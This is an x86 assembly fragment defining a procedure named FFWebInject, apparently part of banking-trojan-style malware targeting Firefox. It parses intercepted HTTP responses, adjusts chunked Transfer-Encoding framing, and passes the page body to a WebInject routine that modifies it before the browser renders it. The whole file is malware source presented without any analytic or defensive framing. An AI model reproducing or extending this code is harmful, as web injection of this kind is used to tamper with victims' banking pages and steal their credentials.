
.code

;; ==================================================================================================== ;;
;; FFWebInject -                                                                                        ;;
;;                                                                                                      ;;
;; ==================================================================================================== ;;
FFWebInject proc dwHandle, lpData : dword

	pushad
	mov  esi, lpData
	mov  ecx, [esi]		;; data len
	add  esi, 4			;; data begin ptr
	lea  edi, [ecx+esi]	;; data end ptr


	invokx  &StrIPos[ebx], esi, ecx, "\r\n\r\n", 4
	mov  edx, eax		;; ptr to content start


	sub  eax, esi		;; headers len
	invokx  &StrIPos[ebx], esi, eax, "\r\nTransfer-Encoding:", 20
	jmpz eax, @F


	lea  eax, [edx+4]
	invokx  &StrIPos[ebx], eax, 10, "\r\n", 2
	jmpz eax, @ret

	lea  edx, [eax-2]	;; ptr to content start
	sub  edi, 7			;; ptr to content end


@@:	mov  ecx, [edx]		;; save dword
	lea  eax, [edi-4]
	sub  eax, edx		;; content len
	mov  [edx], eax		;; put new len


	invokx  &WebInject[ebx], dwHandle, edx


	xchg ecx, [edx]			;; restore saved dword
	lea  edi, [edx+ecx+4]	;; pointer to end of data
	cmp  dword ptr [edx], 0A0D0A0Dh
	je   @F
	invokx  &strcpyn[ebx], edi, "\r\n0\r\n\r\n", 7
	add  edi, 7


@@:	sub  edi, esi
	mov  [esi-4], edi


@ret:
	popad
	ret
FFWebInject endp

